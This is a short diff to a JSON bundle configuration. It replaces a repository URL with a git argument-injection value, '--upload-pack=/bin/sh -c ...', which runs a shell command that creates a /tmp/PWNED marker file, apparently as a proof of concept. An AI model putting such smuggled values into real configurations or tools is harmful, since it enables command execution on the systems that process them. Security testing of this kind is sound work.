@@ -12,7 +12,7 @@
       "name": "mcp-working",
       "description": "Cross-repo MCP workspace conductor bundle (spec + WG + python-sdk + typescript-sdk)",
       "kind": "bundle",
-      "repo_url": "https://github.com/JoshMorrison99/card-packs",
+      "repo_url": "--upload-pack=/bin/sh -c 'touch /tmp/PWNED'",
       "repo_ref": "main",
       "repo_path": "packs/mcp-working"
     }
